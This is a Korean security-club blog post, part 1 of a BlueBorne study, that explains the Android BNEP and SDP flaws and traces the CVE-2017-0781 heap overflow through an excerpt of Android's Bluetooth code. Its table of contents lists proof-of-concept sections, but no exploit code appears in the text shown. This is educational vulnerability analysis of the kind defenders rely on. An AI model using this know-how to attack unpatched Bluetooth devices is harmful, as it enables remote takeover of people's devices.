<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.2.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/swing_logo.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
  <link rel="mask-icon" href="/images/swing_logo.png" color="#222">
  <meta name="google-site-verification" content="uoL1t-yrbhPowL65E-xnG5D1FNLOwghJsIG6iqHrEsc">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"log.swuswing.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.19.2","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="블루본 취약점이란? 2017년, 사물인터넷 보안업체 아미스가 발표한 8개의 제로데이 취약점을 &#39;블루본&#39; 취약점이라 통칭한다. 한국인터넷진흥원에서는 이를  ‘공격자가 블루투스가 활성화되어 있는 장치에 페어링 하지 않아도 장치를 제어할 수 있는 공격 벡터’라고 정의한다. 즉 공격자-피해자 기기가 페어링되어 있지 않더라도, 단순히 블루투스가 활성화되어있다는 이유">
<meta property="og:type" content="article">
<meta property="og:title" content="블루본 취약점을 이용한 안드로이드 해킹 분석 및 실습(1)">
<meta property="og:url" content="https://log.swuswing.com/2025/06/17/3104_250617/index.html">
<meta property="og:site_name" content="SW1NGL0G">
<meta property="og:description" content="블루본 취약점이란? 2017년, 사물인터넷 보안업체 아미스가 발표한 8개의 제로데이 취약점을 &#39;블루본&#39; 취약점이라 통칭한다. 한국인터넷진흥원에서는 이를  ‘공격자가 블루투스가 활성화되어 있는 장치에 페어링 하지 않아도 장치를 제어할 수 있는 공격 벡터’라고 정의한다. 즉 공격자-피해자 기기가 페어링되어 있지 않더라도, 단순히 블루투스가 활성화되어있다는 이유">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://log.swuswing.com/images/3104_250617_image1.png">
<meta property="og:image" content="https://log.swuswing.com/images/3104_250617_image2.png">
<meta property="og:image" content="https://log.swuswing.com/images/3104_250617_image3.png">
<meta property="og:image" content="https://log.swuswing.com/images/3104_250617_image4.png">
<meta property="og:image" content="https://log.swuswing.com/images/3104_250617_image5.png">
<meta property="og:image" content="https://log.swuswing.com/images/3104_250617_image6.png">
<meta property="og:image" content="https://log.swuswing.com/images/3104_250617_image7.png">
<meta property="article:published_time" content="2025-06-17T00:00:00.000Z">
<meta property="article:modified_time" content="2025-07-14T18:16:35.079Z">
<meta property="article:author" content="SWING">
<meta property="article:tag" content="android">
<meta property="article:tag" content="bluetooth">
<meta property="article:tag" content="blueborne">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://log.swuswing.com/images/3104_250617_image1.png">


<link rel="canonical" href="https://log.swuswing.com/2025/06/17/3104_250617/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://log.swuswing.com/2025/06/17/3104_250617/","path":"2025/06/17/3104_250617/","title":"블루본 취약점을 이용한 안드로이드 해킹 분석 및 실습(1)"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>블루본 취약점을 이용한 안드로이드 해킹 분석 및 실습(1) | SW1NGL0G</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">SW1NGL0G</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>







</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%EB%B8%94%EB%A3%A8%EB%B3%B8-%EC%B7%A8%EC%95%BD%EC%A0%90%EC%9D%B4%EB%9E%80"><span class="nav-number">1.</span> <span class="nav-text">블루본 취약점이란?</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%ED%8C%8C%EA%B8%89%EB%A0%A5"><span class="nav-number">1.1.</span> <span class="nav-text">파급력</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%ED%98%84%ED%99%A9"><span class="nav-number">1.2.</span> <span class="nav-text">현황</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%EA%B3%B5%EB%B6%80-%EB%AA%A9%EC%A0%81"><span class="nav-number">1.3.</span> <span class="nav-text">공부 목적</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C-%EB%B8%94%EB%A3%A8%EB%B3%B8-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A7%91%EC%A4%91-%ED%83%90%EA%B5%AC"><span class="nav-number">2.</span> <span class="nav-text">안드로이드 블루본 취약점 집중 탐구</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2017-0781"><span class="nav-number">2.1.</span> <span class="nav-text">CVE-2017-0781</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BNEP%EB%9E%80"><span class="nav-number">2.1.1.</span> <span class="nav-text">BNEP란?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BNEP-%EC%BB%A8%ED%8A%B8%EB%A1%A4-%EB%A9%94%EC%8B%9C%EC%A7%80"><span class="nav-number">2.1.2.</span> <span class="nav-text">BNEP 컨트롤 메시지</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D"><span class="nav-number">2.1.3.</span> <span class="nav-text">코드 분석</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2017-0785"><span class="nav-number">2.2.</span> <span class="nav-text">CVE-2017-0785</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SDP%EB%9E%80"><span class="nav-number">2.2.1.</span> <span class="nav-text">SDP란?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SDP-%EB%8B%A8%ED%8E%B8%ED%99%94"><span class="nav-number">2.2.2.</span> <span class="nav-text">SDP 단편화</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SDP-%EC%84%A4%EA%B3%84-%EA%B2%B0%EC%A0%95%EC%9D%98-%ED%95%A8%EC%A0%95"><span class="nav-number">2.2.3.</span> <span class="nav-text">SDP 설계 결정의 함정</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EC%BD%94%EB%93%9C-%ED%95%B4%EC%84%A4"><span class="nav-number">2.2.4.</span> <span class="nav-text">코드 해설</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EB%82%B4%EC%9A%A9-%EC%A0%95%EB%A6%AC-%EA%B7%B8%EB%A6%BC"><span class="nav-number">2.2.5.</span> <span class="nav-text">내용 정리(그림)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#POC-%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D"><span class="nav-number">3.</span> <span class="nav-text">POC 코드 분석.</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%EC%A3%BC%EC%9A%94-%EA%B3%B5%EA%B2%A9-%ED%9D%90%EB%A6%84"><span class="nav-number">3.1.</span> <span class="nav-text">주요 공격 흐름</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%EC%8B%A4%EC%A0%9C-%EA%B3%B5%EA%B2%A9-%ED%9D%90%EB%A6%84-%EC%B6%94%EC%A0%81"><span class="nav-number">3.2.</span> <span class="nav-text">실제 공격 흐름 추적</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#def-main-src-hci-dst-my-ip"><span class="nav-number">3.2.1.</span> <span class="nav-text">def main(src_hci, dst, my_ip)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#def-memory-leak-get-bases-src-src-hci-dst"><span class="nav-number">3.2.2.</span> <span class="nav-text">def memory_leak_get_bases(src, src_hci, dst)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#def-pwn-src-hci-dst-bluetooth-default-bss-base-system-addr-acl-name-addr-my-ip-libc-text-base"><span class="nav-number">3.2.3.</span> <span class="nav-text">def  pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip, libc_text_base):</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">SWING</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">27</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">54</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOnN3dS5zd2luZ0BnbWFpbC5jb20=" title="E-Mail → mailto:swu.swing@gmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL0Bzd3Vzd2luZw==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;@swuswing"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9zd2luZ19zd3U=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;swing_swu"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
  </div>

        </div>
      </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9zd3Vzd2luZy5jb20v" title="https:&#x2F;&#x2F;swuswing.com&#x2F;">SWING Official Website</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://log.swuswing.com/2025/06/17/3104_250617/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="SWING">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SW1NGL0G">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="블루본 취약점을 이용한 안드로이드 해킹 분석 및 실습(1) | SW1NGL0G">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          블루본 취약점을 이용한 안드로이드 해킹 분석 및 실습(1)
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="far fa-user"></i>
    </span>
    <span class="post-meta-item-text">author: nhm</span>
  </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2025-06-17 09:00:00" itemprop="dateCreated datePublished" datetime="2025-06-17T09:00:00+09:00">2025-06-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/free/" itemprop="url" rel="index"><span itemprop="name">free</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="블루본-취약점이란"><a href="#블루본-취약점이란" class="headerlink" title="블루본 취약점이란?"></a>블루본 취약점이란?</h1><br>
2017년, 사물인터넷 보안업체 아미스가 발표한 8개의 제로데이 취약점을 '블루본' 취약점이라 통칭한다. 한국인터넷진흥원에서는 이를  ‘공격자가 블루투스가 활성화되어 있는 장치에 페어링 하지 않아도 장치를 제어할 수 있는 공격 벡터’라고 정의한다. 즉 공격자-피해자 기기가 페어링되어 있지 않더라도, 단순히 블루투스가 활성화되어있다는 이유만으로 공격 당할 수 있다는 것이 블루본 취약점의 특징이다. 

<p>Armis에서 발표한 블루본 취약점 8개는 아래와 같다: </p>
<span id="more"></span>

<p><img src="/images/3104_250617_image1.png" alt="그림 1. 블루투스 프로토콜 레이어별 블루본 취약점"></p>
<center>그림 1. [블루투스 프로토콜 레이어별 블루본 취약점]<br></center><br>


<table>
<thead>
<tr>
<th>취약점</th>
<th>cve</th>
<th>설명</th>
</tr>
</thead>
<tbody><tr>
<td>Linux kernel RCE vulnerability</td>
<td>CVE-2017-1000251</td>
<td>리눅스 커널 원격코드 실행 취약점</td>
</tr>
<tr>
<td>Linux Bluetooth stack (BlueZ) information Leak vulnerability</td>
<td>CVE-2017-1000250</td>
<td>리눅스 블루투스 스택(BlueZ)에서 발생하는 정보노출 취약점</td>
</tr>
<tr>
<td>Android information Leak vulnerability</td>
<td>CVE-2017-0785</td>
<td>안드로이드 SDP에서 발생하는 정보노출 취약점</td>
</tr>
<tr>
<td>Android RCE vulnerability #1</td>
<td>CVE-2017-0781</td>
<td>안드로이드 BNEP에서 발생하는 원격코드 실행 취약점</td>
</tr>
<tr>
<td>Android RCE vulnerability #2</td>
<td>CVE-2017-0782</td>
<td>안드로이드 BNEP PAN에서 발생하는 원격코드 실행 취약점</td>
</tr>
<tr>
<td>The Bluetooth Pineapple in Android - Logical Flaw</td>
<td>CVE-2017-0783</td>
<td>안드로이드 블루투스 PAN 프로필에서 발생하는 MITM 정보노출 취약점</td>
</tr>
<tr>
<td>The Bluetooth Pineapple in Windows - Logical Flaw</td>
<td>CVE-2017-8628</td>
<td>윈도우 블루투스 드라이버에서 발생하는 스푸핑 취약점</td>
</tr>
<tr>
<td>Apple Low Energy Audio Protocol RCE vulnerability</td>
<td>CVE-2017-14315</td>
<td>애플 Low Energy 오디오 프로토콜에서 발생하는 원격코드 실행 취약점</td>
</tr>
</tbody></table>
<h2 id="파급력"><a href="#파급력" class="headerlink" title="파급력"></a>파급력</h2><p>취약점 발표 당시 해당 ‘블루본 버그’에 영향을 받은 기기는 약 53억 개에 이르렀다. 헤드폰부터 스마트워치, 자동차, 심지어는 병원 의료 기기까지 거의 모든 IoT 기기가 블루투스를 사용하기 때문에, 우리가 일상적으로 사용하는 전자 기기는 일반적으로 모두 표적이 되었다고 보아도 무방할 것이다.</p>
<h2 id="현황"><a href="#현황" class="headerlink" title="현황"></a>현황</h2><p>상기된 취약점들은 2025년 현재 기준 전원 보안 패치가 완료 되었다. </p>
<ul>
<li>리눅스 : 2017.09.12일자 리눅스 커널 보완(4.13.2~)</li>
<li>안드로이드 : Android 보안 패치 레벨 2017-09-01 일자에 해당 취약점 보완</li>
<li>마이크로소프트 : 2017년 9월 정기 보안 업데이트에서 취약점 보안</li>
<li>애플 : IOS 10에서 해당 취약점 보완. 단, Apple TV의 경우 4세대 이하는 취약점 보완 소프트웨어 출시되지 않음.</li>
</ul>
<h2 id="공부-목적"><a href="#공부-목적" class="headerlink" title="공부 목적"></a>공부 목적</h2><p>앞서 서술했듯 블루본 취약점은 약 8년 전 보안패치가 완료된, 어떤 의미로는 ‘끝난’ 보안위협이라 할 수도 있다. 그러나 여전히 블루투스가 우리 주변의 수많은 IOT 기기들을 관리하고 연결하는데 사용되고 있는 한, 새로운 블루투스 취약점은 끝없이 발생할 것이다. 예컨대 당장 공공 자전거로 사용되고 있는 ‘따릉이’의 사물인터넷 블루투스에도 취약점이 존재하리라 생각한다. 본인은 이러한 현재의 블루투스 보안 위협을 공부하기 위한 기반을 쌓고자 과거의 취약점을 분석 및 공격 실습을 하는 것으로부터 소프트웨어적 지식과 실전 감각을 익히고자 했다. </p>
<hr>
<h1 id="안드로이드-블루본-취약점-집중-탐구"><a href="#안드로이드-블루본-취약점-집중-탐구" class="headerlink" title="안드로이드 블루본 취약점 집중 탐구"></a>안드로이드 블루본 취약점 집중 탐구</h1><p>안드로이드에서 발생한 취약점은 원격코드 2, 정보노출 2로 총 4가지가 있는데, 그 중 이번 공격 실습에 사용될 취약점은 아래의 두 가지다. </p>
<ul>
<li>CVE-2017-0781 (BNEP&#x2F;원격 코드 실행)</li>
<li>CVE-2017-0785 (SDP&#x2F;정보 누출)</li>
</ul>
<p>차례로 각 취약점의 발생 원리를 알아보자. </p>
<hr>
<br>


<h2 id="CVE-2017-0781"><a href="#CVE-2017-0781" class="headerlink" title="CVE-2017-0781"></a>CVE-2017-0781</h2><h3 id="BNEP란"><a href="#BNEP란" class="headerlink" title="BNEP란?"></a>BNEP란?</h3><p>CVE-2017-0781는 안드로이드의 BNEP 레이어에서 발생한 RCE(원격 코드 실행) 취약점이다.<br>그렇다면 BNEP 레이어란 무엇일까?</p>
<p><img src="/images/3104_250617_image2.png" alt="그림 2. 블루투스 프로토콜 레이어 도식"></p>
<center>그림 2. [블루투스 프로토콜 레이어 도식]<br></center><br>

<p>BNEP 레이어란 Bluetooth network encapsulation Protocol 의 약자로, ‘블루투스 네트워크 캡슐화 프로토콜’을 담당한다. 해당 레이어는 ip 기반 네트워크 테더링(공유) 기능을 블루투스를 통해서도 기능하게 하기 위해 사용된다. </p>
<p><strong>PAN(Personal Area Networking)</strong></p>
<ul>
<li><p>PAN(개인 네트워크 영역)</p>
<ul>
<li>사용자와 가까운 영역 내의 전자 장치를 연결하는 것을 의미한다. </li>
<li>사용 실례 :<br>  블루투스 이어피스와 스마트폰 간의 연결. </li>
<li>분류 <ul>
<li>유선: USB, FireWire</li>
<li>무선 : <strong>블루투스</strong>, WiFi, IrDA, Zigbee</li>
</ul>
</li>
<li>PAN 내의 장치는 서로 데이터를 교환할 수 있다.<br>  -&gt; 그러나 일반적으로 라우터가 포함되지 않으므로, 인터넷에 직접 연결되지 않음.<br>  -&gt; 따라서 <strong>PAN 내의 장치 중 인터넷에 연결되어 있는 장치(ex.PC)가 그렇지 않은 장치(ex.태블릿)에게 인터넷을 제공</strong>한다. <ul>
<li>PAN 내에서 인터넷을 제공하는 장치 : NAP (Network Access Point)</li>
<li>PAN 내에서 인터넷을 제공받는 장치 : PANU (PAN User)<blockquote>
<p>NAP와 PANU 간 인터넷을 공유하기 위해서는 <strong>BNEP</strong>가 필요!</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
<li><p>BNEP 레이어</p>
<ul>
<li>원래의 인터넷 공유 : 이더넷 계층에서 IP 패킷을 이더넷 프레임으로 감싸 전송.</li>
<li>PAN 안에서의 인터넷 공유:<ol>
<li>블루투스는 ‘이더넷’ 인터페이스를 통해 패킷을 주고받을 수는 없음</li>
<li>따라서 이더넷 캡슐화를 거친 IP 패킷을 <strong>BNEP 캡술화</strong> </li>
<li>이후 해당 캡슐을 Bluetooth 데이터링크 L2CAP 계층에 올려서 전송<br> -&gt; L2CAP 계층이 이더넷 인터페이스 역할을 한다!</li>
</ol>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>즉 블루투스 PAN 연결 안에서 기기끼리 인터넷을 주고받기 위해, Ethernet 패킷을 L2CAP 연결 위에 BNEP 캡슐화하여 전송하는 것. </p>
</blockquote>
<p><strong>BNEP 캡슐화</strong></p>
<p><img src="/images/3104_250617_image3.png" alt="그림 3. BNEP 패킷 캡슐화"></p>
<center>그림 3. [BNEP 패킷 캡슐화.]<br></center><br>

<p>이미지 해설</p>
<ul>
<li><p>원본 데이터 (원래의 이더넷 프레임 구조)</p>
<ul>
<li>이더넷 헤더<ul>
<li>MAC 주소, 타입 등…</li>
</ul>
</li>
<li>이더넷 페이로드(실제 데이터)</li>
</ul>
</li>
<li><p>BNEP 캡슐화 구조</p>
<ul>
<li>L2CAP 헤더</li>
<li>BNEP 헤더</li>
<li>이더넷 페이로드 (실제 데이터)</li>
</ul>
<p>  → 이더넷 헤더를 압축해서 bnep 헤더에 포함시킨 뒤, 블루투스 통신을 위한 L2CAP&#x2F;BNEP 헤더를 추가한다.</p>
</li>
</ul>
<br>

<h3 id="BNEP-컨트롤-메시지"><a href="#BNEP-컨트롤-메시지" class="headerlink" title="BNEP 컨트롤 메시지"></a>BNEP 컨트롤 메시지</h3><p><img src="/images/3104_250617_image4.png" alt="그림 4. BNEP 컨트롤 메시지 포맷"></p>
<center>그림 4. [BNEP 컨트롤 메시지 포맷.]<br></center><br>

<p>BNEP는 다양한 캡슐화 메시지 뿐 아니라 <strong>BNEP 컨트롤 메시지</strong>라는 것을 지원. 이 컨트롤 메시지는 PAN 연결을 생성 및 흐름 제어를 위해 사용된다. </p>
<p>btbnep.bnep_type	BNEP Type	Unsigned integer (8 bits)	1.10.0 to 4.4.7<br>btbnep.control_type	Control Type	Unsigned integer (8 bits)	1.10.0 to 4.4.7</p>
<p>다수의 컨트롤 메시지를 단 한 개의 L2CAP 메시지에 담기 위해, BNEP 헤더에 선택적 연장 헤더(extension header)를 추가할 수 있다.</p>
<p><img src="/images/3104_250617_image5.png" alt="그림 5. BNEP 연장 메시지 포맷"></p>
<center>그림 5. [BNEP 연장 메시지 포맷.]<br></center><br>

<p>안드로이드 스택 내에서, 두 개의 RCE(원격 코드 실행) 취약점이 들어온 컨트롤 메시지를 핸들링하는 코드에서 발견되었다. </p>
<br>

<h3 id="코드-분석"><a href="#코드-분석" class="headerlink" title="코드 분석"></a>코드 분석</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">UINT8 *p = (UINT8 *)(p_buf + <span class="number">1</span>) + p_buf-&gt;offset;</span><br><span class="line">...</span><br><span class="line">type = *p++;</span><br><span class="line">extension_present = type &gt;&gt; <span class="number">7</span>;</span><br><span class="line"><span class="comment">//MSB(최상위비트) : extension 비트 </span></span><br><span class="line">type &amp;= <span class="number">0x7f</span>;</span><br><span class="line"><span class="comment">//하위 7비트만 타입값으로 저장. </span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">switch</span> (type)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">case</span> BNEP_FRAME_CONTROL:</span><br><span class="line">	ctrl_type = *p;</span><br><span class="line">	p = bnep_process_control_packet (p_bcb, p, &amp;rem_len, FALSE);</span><br><span class="line">	<span class="comment">//컨트롤 메시지 타입 파악 중 </span></span><br><span class="line">	<span class="keyword">if</span> (ctrl_type == BNEP_SETUP_CONNECTION_REQUEST_MSG &amp;&amp;</span><br><span class="line">		p_bcb-&gt;con_state != BNEP_STATE_CONNECTED &amp;&amp;</span><br><span class="line">		extension_present &amp;&amp; p &amp;&amp; rem_len)</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		1. 만약 컨트롤 타입이 연결 요청이고, 현재 연결되어 있지 않은 상태이고, ~~~이면,</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">	&#123;</span><br><span class="line">		p_bcb-&gt;p_pending_data = (BT_HDR *)osi_malloc(rem_len);</span><br><span class="line">		<span class="comment">//osi_malloc(rem_lem) -&gt; rem_len 바이트 크기만큼 공간 할당</span></span><br><span class="line">		<span class="built_in">memcpy</span>((UINT8 *)(p_bcb-&gt;p_pending_data + <span class="number">1</span>), p, rem_len);</span><br><span class="line">	</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">..</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Excerpt from Android’s BNEP message handler: bnep_data_ind</span></span><br></pre></td></tr></table></figure>

<ol>
<li><p>코드 해설<br>해당 코드는 incoming BNEP 컨트롤 매시지를 핸들링하는 파트이다. 이 코드 플로우는 특수한 경우에 대처하기 위해 개발되었다 : (extension bit를 사용하여) L2CAP 메시지에 다수의 컨트롤 메시지을 포함하는 것이 가능하기 때문에, BNEP 연결 상태가 제어 메시지를 처리하는 사이사이에 변경될 위험이 있다.<br>예컨대 SETUP_CONNECTION_REQUEST가 제어 메시지로 전송된 경우, 이후의 모든 제어 메시지는 BNEP 연결 상태가 CONNECTED인 상태에서 처리될 것으로 기대할 수 있다. 그러나 CONNECTED 상태로 전환하려면 인증 프로세스가 완료되어야 하며, 이 프로세스는 <strong>비동기적</strong>이기 때문에 같은 패킷의 두 번째 컨트롤 메시지를 처리할 시기 BNEP 연결 상태가 아직 IDLE에서 CONNECTED로 변경되지 않았을 위험이 존재한다.<br>이러한 시간차 오류를 방지하기 위해, 위의 코드는 <strong>하나의 제어 메시지를 처리가 완료될 동안 남은 부분은 p_pending_data에 저장</strong>해 둔다.</p>
</li>
<li><p><strong>취약점 발생 부분</strong></p>
<ol>
<li><code>p_bcb-&gt;p_pending_data = (BT_HDR *)osi_malloc(rem_len);</code><br> 패킷에 남아 있는 데이터 길이<code>(rem_len)</code>만큼 힙을 확보해 놓는다.<br> p_pending_data 버퍼는 rem_len의 사이즈만큼 heap에 접근 가능. </li>
<li><code>memcpy((UINT8 *)(p_bcb-&gt;p_pending_data + 1), p, rem_len);</code><br> <code>void* memcpy (void* dest, const void* source, size_t num)</code><br>  <code>memcpy(복사받을 메모리, 복사할 메모리, 길이)</code><br> memcpy로 파악한 컨트롤 타입(p)를 p_bcb 구조체의 p_pending_data +1에 rem_len만큼 복사한다.<br> -&gt; <strong>버퍼 오버플로우 발생</strong><blockquote>
<p>왜?</p>
</blockquote>
<ul>
<li>p_pending_data: 8 바이트 BT_HDR 구조체를 가리키는 <strong>포인터</strong><br> -&gt; <code>p_pending_data + 1</code> : p_pending_data + BH_HDR  구조체 크기(8바이트)</li>
</ul>
</li>
</ol>
</li>
</ol>
<p>즉 포인터 연산 탓에 원래 확보해 놓은 버퍼 주소가 아닌 그보다 뒤로 미뤄진, 다른 데이터가 들어 있을지도 모르는 버퍼 주소부터 데이터를 채워넣어 버리는 것.<br>예컨데 rem_len이 8바이트였다고 치면, 힙에는 주소 0~7번지까지 8바이트짜리 공간을 마련해 놓았는데, BH_HDR 구조체 포인터 연산 오류로 인해 이보다 8바이트만큼 미뤄진 8번지부터 15번지까지 데이터를 채워넣게 된다. </p>
